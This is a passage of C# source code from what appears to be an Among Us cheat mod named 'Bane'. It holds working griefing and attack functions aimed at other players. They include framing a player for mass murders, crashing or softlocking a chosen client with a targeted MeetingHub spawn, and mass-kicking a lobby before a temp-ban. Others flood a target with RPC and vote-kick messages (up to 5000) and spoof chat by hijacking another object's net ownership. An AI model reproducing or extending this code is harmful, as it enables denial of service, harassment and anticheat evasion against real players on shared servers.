				Bane.notifications.Send("Framer", "The game must have started for this option for this option to work.");
				yield break;
			}

			ModuleManager.disableGameEnd.Enabled = true;

			if(target != PlayerControl.LocalPlayer)
			{
				// On official servers, we are not able to send MurderPlayer RPCs with other player net IDs
				// so we need to shapeshift into our desired player and kill everyone ourselves
				Utilities.ShapeshiftPlayer(PlayerControl.LocalPlayer, target, false);
			}

			foreach(PlayerControl player in PlayerControl.AllPlayerControls)
			{
				if(player == target) continue;

				PlayerControl.LocalPlayer.RpcMurderPlayer(player, true);
			}

			// Wait three seconds so all players can see which player we are framing
			yield return Effects.Wait(3.0f);

			ModuleManager.disableGameEnd.Enabled = false;
			Bane.notifications.Send("Framer", $"Framed {target.Data.PlayerName} for killing all players!");
		}


		/// <summary>
		/// GameDataTo MeetingHub to one client. lobbyOnly=true requires not Started;
		/// lobbyOnly=false requires Started (softlock mid-game).
		/// </summary>


		private static void DespawnTargetPlayer(PlayerControl target, bool hollowInfo, bool despawnBody)
		{
			if (target == null || AmongUsClient.Instance == null)
			{
				Bane.notifications.Send("Despawn", "Invalid target.", 3);
				return;
			}

			if (Utilities.IsAnticheatPresent() && !Utilities.IsHostEffective())
			{
				Bane.notifications.Send("Despawn", "Host only on public AC.", 4);
				return;
			}

			string name = target.Data != null ? target.Data.PlayerName : "?";
			int did = 0;

			if (despawnBody)
			{
				try
				{
					target.Despawn();
					did++;
					Bane.Log.LogInfo("Despawn Player body: " + name);
				}
				catch (Exception e)
				{
					Bane.Log.LogWarning("Despawn body failed: " + e.Message);
					try
					{
						InnerNetObject net = target.TryCast<InnerNetObject>();
						if (net != null)
						{
							net.Despawn();
							did++;
						}
					}
					catch (Exception e2)
					{
						Bane.Log.LogWarning("Despawn body InnerNet: " + e2.Message);
					}
				}
			}

			if (hollowInfo)
			{
				try
				{
					NetworkedPlayerInfo info = null;
					try { info = target.Data; } catch { }

					if (info == null)
					{
						Bane.notifications.Send("Hollow", "No PlayerInfo left for " + name + ".", 4);
					}
					else
					{
						try
						{
							InnerNetObject infoNet = info.TryCast<InnerNetObject>();
							if (infoNet != null)
								infoNet.Despawn();
							else
								info.Despawn();
							did++;
							Bane.Log.LogInfo("Hollow PlayerInfo: " + name);
						}
						catch
						{
							try
							{
								UnityEngine.Object.Destroy(info.gameObject);
								did++;
							}
							catch (Exception e3)
							{
								Bane.Log.LogWarning("Hollow destroy: " + e3.Message);
							}
						}
					}
				}
				catch (Exception e)
				{
					Bane.Log.LogWarning("Hollow PlayerInfo failed: " + e.Message);
					Bane.notifications.Send("Hollow", e.Message, 5);
					return;
				}
			}

			string label = despawnBody && hollowInfo ? "Purge Player" : hollowInfo ? "Hollow Player" : "Despawn Player";
			Bane.notifications.Send(label, label + ": " + name + " (" + did + " despawn(s)).", 4);
		}

		private static void TestBanMeetingOnlyThem(PlayerControl target)
		{
			if (target == null || AmongUsClient.Instance == null)
			{
				Bane.notifications.Send("Test Ban", "Invalid target.", 3);
				return;
			}

			if (!Utilities.IsHostEffective())
			{
				Bane.notifications.Send("Test Ban", "Host only.", 4);
				return;
			}

			var list = AmongUsClient.Instance.NonAddressableSpawnableObjects;
			if (list == null)
			{
				Bane.notifications.Send("Test Ban", "No spawnable list.", 3);
				return;
			}

			InnerNetObject prefab = null;
			for (int i = 0; i < list.Count; i++)
			{
				var obj = list[i];
				if (obj == null) continue;
				string n = obj.gameObject != null ? obj.gameObject.name : "";
				if (obj.SpawnId == 1 || n.IndexOf("Meeting", System.StringComparison.OrdinalIgnoreCase) >= 0)
				{
					prefab = obj;
					break;
				}
			}

			if (prefab == null)
			{
				Bane.notifications.Send("Test Ban", "MeetingHub prefab not found.", 3);
				return;
			}

			try
			{
				InnerNetObject spawned = UnityEngine.Object.Instantiate(prefab).Cast<InnerNetObject>();
				BatchedMessage batch = new BatchedMessage(target.OwnerId);
				batch.QueueSpawn(spawned, -2, SpawnFlags.None);

				uint meetingNetId = spawned.NetId;
				batch.QueueCloseMeetingByNetId(meetingNetId);
				batch.FinishBatch();

				try
				{
					AmongUsClient.Instance.RemoveNetObject(spawned);
					UnityEngine.Object.Destroy(spawned.gameObject);
				}
				catch (Exception ex)
				{
					Bane.Log.LogWarning($"Test Ban local cleanup: {ex.Message}");
				}

				Bane.Log.LogInfo($"Test Ban: MeetingHub+Close GameDataTo {target.Data?.PlayerName} netId={meetingNetId}");
				Bane.notifications.Send("Test Ban", $"MeetingHub+Close sent only to {target.Data?.PlayerName}.", 4);
			}
			catch (Exception e)
			{
				Bane.Log.LogError($"Test Ban failed: {e}");
				Bane.notifications.Send("Test Ban", e.Message, 5);
			}
		}

		private static void CrashTargetWithMeetingHub(PlayerControl target, bool lobbyOnly)
		{
			if (target == null || AmongUsClient.Instance == null)
			{
				Bane.notifications.Send(lobbyOnly ? "Crash Game" : "Softlock", "Invalid target.", 3);
				return;
			}

			if (!Utilities.IsHostEffective())
			{
				Bane.notifications.Send(lobbyOnly ? "Crash Game" : "Softlock", "You must be host.", 4);
				return;
			}

			var state = AmongUsClient.Instance.GameState;
			bool started = state == InnerNetClient.GameStates.Started;

			if (lobbyOnly && started)
			{
				Bane.notifications.Send("Crash Game", "Lobby only - game already started. Use Softlock.", 4);
				return;
			}

			if (!lobbyOnly && !started)
			{
				Bane.notifications.Send("Softlock", "Mid-game only - use Crash Game in lobby.", 4);
				return;
			}

			var list = AmongUsClient.Instance.NonAddressableSpawnableObjects;
			if (list == null)
			{
				Bane.notifications.Send(lobbyOnly ? "Crash Game" : "Softlock", "No spawnable list.", 3);
				return;
			}

			InnerNetObject prefab = null;
			for (int i = 0; i < list.Count; i++)
			{
				var obj = list[i];
				if (obj == null) continue;
				string n = obj.gameObject != null ? obj.gameObject.name : "";
				if (obj.SpawnId == 1 || n.IndexOf("Meeting", System.StringComparison.OrdinalIgnoreCase) >= 0)
				{
					prefab = obj;
					break;
				}
			}

			if (prefab == null)
			{
				Bane.notifications.Send(lobbyOnly ? "Crash Game" : "Softlock", "MeetingHub prefab not found.", 3);
				return;
			}

			try
			{
				InnerNetObject spawned = UnityEngine.Object.Instantiate(prefab).Cast<InnerNetObject>();
				BatchedMessage batch = new BatchedMessage(target.OwnerId);
				batch.QueueSpawn(spawned, -2, SpawnFlags.None);
				batch.FinishBatch();

				string label = lobbyOnly ? "Crash Game" : "Softlock";
				Bane.Log.LogInfo($"{label}: MeetingHub GameDataTo {target.Data?.PlayerName} ({target.OwnerId})");
				Bane.notifications.Send(label, $"MeetingHub sent only to {target.Data?.PlayerName}.", 4);
			}
			catch (Exception e)
			{
				Bane.Log.LogError($"MeetingHub target spawn failed: {e}");
				Bane.notifications.Send(lobbyOnly ? "Crash Game" : "Softlock", e.Message, 5);
			}
		}

		private void ExecuteLobbyBan(PlayerControl keep)
		{
			if (keep == null || AmongUsClient.Instance == null || !Utilities.IsHostEffective())
			{
				Bane.notifications.Send("Ban", "Failed - need host + valid target.", 4);
				return;
			}

			// TempBanAll penalises everyone left in the lobby and cannot exclude individuals,
			// so the only thing we can protect is a whitelisted player who is kicked beforehand (done below).
			// The one player we keep is the one being banned, so refuse if that is a whitelisted player.
			if(Whitelist.IsWhitelisted(keep))
			{
				Bane.notifications.Send("Ban", "Cancelled: the target is whitelisted. Remove them from the whitelist first.", 6);
				return;
			}

			string keepName = keep.Data != null ? keep.Data.PlayerName : "?";
			int kicked = 0;

			// Kick whitelisted players first so they are out of the lobby before Temp Ban All starts,
			// then everyone else (snapshot first since kicking mutates the player list)
			List<PlayerControl> toKick = new List<PlayerControl>();
			foreach (PlayerControl pc in PlayerControl.AllPlayerControls)
			{
				if (pc == null || pc.Data == null) continue;
				if (pc == keep) continue;
				if (pc == PlayerControl.LocalPlayer) continue;
				toKick.Add(pc);
			}
			toKick.Sort((a, b) => Whitelist.IsWhitelisted(b).CompareTo(Whitelist.IsWhitelisted(a)));

			foreach (PlayerControl pc in toKick)
			{
				try
				{
					AmongUsClient.Instance.KickPlayer(pc.OwnerId, false);
					kicked++;
				}
				catch (Exception ex)
				{
					Bane.Log.LogWarning($"Ban kick failed for {pc.Data.PlayerName}: {ex.Message}");
				}
			}

			Bane.Log.LogInfo($"Ban: kicked {kicked} players, keeping {keepName}; starting TempBanAll");
			Bane.notifications.Send("Ban", $"Kicked {kicked}. Running Temp Ban All (keep: {keepName})…", 6);
			ModuleManager.tempBanAll.Enabled = true;
		}

		
		
		private static void SafeRpcMixOverloadTo(PlayerControl target)
		{
			if (target == null || AmongUsClient.Instance == null || PlayerControl.LocalPlayer == null)
			{
				Bane.notifications.Send("RPC Mix", "Need local+target.", 3);
				return;
			}
			try
			{
				uint net = PlayerControl.LocalPlayer.NetId;
				uint cnt = PlayerControl.LocalPlayer.NetTransform != null
					? PlayerControl.LocalPlayer.NetTransform.NetId
					: net;
				int to = target.OwnerId;

				BatchedMessage batch = new BatchedMessage(to);

				void Rpc(uint id, byte call, System.Action<Hazel.MessageWriter> write = null)
				{
					var w = batch.writer;
					w.StartMessage((byte)AmongUs.InnerNet.GameDataMessages.GameDataTypes.RpcFlag);
					w.WritePacked(id);
					w.Write(call);
					write?.Invoke(w);
					w.EndMessage();
					batch.msgCount++;
				}

				for (int n = 0; n < 3; n++)
				{
					Rpc(net, (byte)RpcCalls.SendChat, w => w.Write(""));
					Rpc(net, (byte)RpcCalls.SetScanner, w => { w.Write(false); w.Write((byte)(n + 1)); });
					Rpc(net, (byte)RpcCalls.CheckName, w => w.Write("x" + n));
					Rpc(net, (byte)RpcCalls.CheckColor, w => w.Write((byte)(n % 18)));
					Rpc(cnt, (byte)RpcCalls.SnapTo, w =>
					{
						NetHelpers.WriteVector2(new UnityEngine.Vector2(PlayerControl.LocalPlayer.transform.position.x, PlayerControl.LocalPlayer.transform.position.y), w);
						w.Write((ushort)(50000 + n));
					});
					Rpc(net, (byte)RpcCalls.CompleteTask, w => w.WritePacked(0));
					Rpc(net, (byte)RpcCalls.PlayAnimation, w => w.Write((byte)0));
					Rpc(net, (byte)RpcCalls.EnterVent, w => w.WritePacked(0));
					Rpc(net, (byte)RpcCalls.ExitVent, w => w.WritePacked(0));
					Rpc(net, (byte)RpcCalls.SetHatStr, w => { w.Write(""); w.Write((byte)n); });
					Rpc(net, (byte)RpcCalls.SetSkinStr, w => { w.Write(""); w.Write((byte)n); });
					Rpc(net, (byte)RpcCalls.SetPetStr, w => { w.Write(""); w.Write((byte)n); });
					Rpc(net, (byte)RpcCalls.SetVisorStr, w => { w.Write(""); w.Write((byte)n); });
					Rpc(net, (byte)RpcCalls.SetNamePlateStr, w => { w.Write(""); w.Write((byte)n); });
					try
					{
						Rpc(net, (byte)RpcCalls.SendChatNote, w =>
						{
							w.Write(PlayerControl.LocalPlayer.PlayerId);
							w.Write((byte)0);
						});
					}
					catch { }
				}

				batch.FinishBatch();
				string name = target.Data != null ? target.Data.PlayerName : "?";
				Bane.notifications.Send("RPC Mix", "Safe mix x3 GameDataTo " + name, 4);
			}
			catch (System.Exception e)
			{
				Bane.notifications.Send("RPC Mix", e.Message, 4);
			}
		}

		private static void VoteKickOverloadBatch(PlayerControl target, int count)
		{
			if (target == null || AmongUsClient.Instance == null)
			{
				Bane.notifications.Send("VoteKick", "No target/client.", 3);
				return;
			}
			if (VoteBanSystem.Instance == null)
			{
				Bane.notifications.Send("VoteKick", "No VoteBanSystem in scene.", 4);
				return;
			}
			count = UnityEngine.Mathf.Clamp(count, 1, 5000);
			int src = AmongUsClient.Instance.ClientId;
			int tgt = target.OwnerId;
			try
			{
				BatchedMessage batch = new BatchedMessage();
				for (int i = 0; i < count; i++)
					batch.QueueAddVote(src, tgt);
				batch.FinishBatch();
				string name = target.Data != null ? target.Data.PlayerName : "?";
				Bane.notifications.Send("VoteKick", "OVERLOAD batch x" + count + " -> " + name, 4);
			}
			catch (System.Exception e)
			{
				Bane.notifications.Send("VoteKick", e.Message, 4);
			}
		}

		private static void VoteKickSpam(PlayerControl target, bool singleBatch)
		{
			if (target == null || AmongUsClient.Instance == null)
			{
				Bane.notifications.Send("VoteKick", "No target/client.", 3);
				return;
			}
			if (VoteBanSystem.Instance == null)
			{
				Bane.notifications.Send("VoteKick", "No VoteBanSystem in scene.", 4);
				return;
			}
			int src = AmongUsClient.Instance.ClientId;
			int tgt = target.OwnerId;
			try
			{
				if (singleBatch)
				{
					BatchedMessage batch = new BatchedMessage();
					for (int i = 0; i < 5; i++)
						batch.QueueAddVote(src, tgt);
					batch.FinishBatch();
				}
				else
				{
					for (int i = 0; i < 5; i++)
					{
						BatchedMessage batch = new BatchedMessage();
						batch.QueueAddVote(src, tgt);
						batch.FinishBatch();
					}
				}
				string name = target.Data != null ? target.Data.PlayerName : "?";
				Bane.notifications.Send("VoteKick", "AddVote x5 -> " + name + " client " + tgt, 3);
			}
			catch (System.Exception e)
			{
				Bane.notifications.Send("VoteKick", e.Message, 4);
			}
		}

		private static void VoteKickAsEveryone(PlayerControl target)
		{
			if (target == null || AmongUsClient.Instance == null || VoteBanSystem.Instance == null)
			{
				Bane.notifications.Send("VoteKick", "Missing state.", 3);
				return;
			}
			int tgt = target.OwnerId;
			int n = 0;
			try
			{
				BatchedMessage batch = new BatchedMessage();
				foreach (PlayerControl pc in PlayerControl.AllPlayerControls)
				{
					if (pc == null) continue;
					batch.QueueAddVote(pc.OwnerId, tgt);
					n++;
				}
				batch.FinishBatch();
				Bane.notifications.Send("VoteKick", "AddVote as " + n + " clients", 3);
			}
			catch (System.Exception e)
			{
				Bane.notifications.Send("VoteKick", e.Message, 4);
			}
		}

		/// <summary>
		/// Force a SendChat RPC that other clients actually process for clones/dummies.
		/// Temporarily claims host ownership of the NetObject, builds a full GameData
		/// RpcFlag message, and also does local AddChat.
		/// </summary>
		private static void SendChatAsServerSided(PlayerControl source, string text)
		{
			if (source == null || AmongUsClient.Instance == null) return;
			if (string.IsNullOrEmpty(text)) text = " ";

			// Local chat so host always sees it
			try
			{
				if (HudManager.Instance != null && HudManager.Instance.Chat != null)
					HudManager.Instance.Chat.AddChat(source, text, false);
			}
			catch { }

			int originalOwner = source.OwnerId;
			bool changedOwner = false;
			try
			{
				// Claim ownership so the RPC is not dropped for non-owned NetIds
				try
				{
					source.OwnerId = AmongUsClient.Instance.ClientId;
					changedOwner = true;
				}
				catch { }

				// 1) Direct StartRpcImmediately (same path Ghost Chat uses)
				try
				{
					var w = AmongUsClient.Instance.StartRpcImmediately(
						source.NetId, (byte)RpcCalls.SendChat, Hazel.SendOption.Reliable, -1);
					w.Write(text);
					AmongUsClient.Instance.FinishRpcImmediately(w);
				}
				catch { }

				// 2) Also push a full GameData RpcFlag batch (more reliable for some hosts / AC)
				try
				{
					Hazel.MessageWriter msg = Hazel.MessageWriter.Get(Hazel.SendOption.Reliable);
					msg.StartMessage((byte)InnerNet.Tags.GameData);
					msg.Write(AmongUsClient.Instance.GameId);

					msg.StartMessage((byte)GameDataTypes.RpcFlag);
					msg.WritePacked(source.NetId);
					msg.Write((byte)RpcCalls.SendChat);
					msg.Write(text);
					msg.EndMessage();

					msg.EndMessage();
					AmongUsClient.Instance.SendOrDisconnect(msg);
					msg.Recycle();
				}
				catch { }
			}
			finally
			{
				if (changedOwner)
				{
					try { source.OwnerId = originalOwner; } catch { }
				}
			}
		}
	}
}
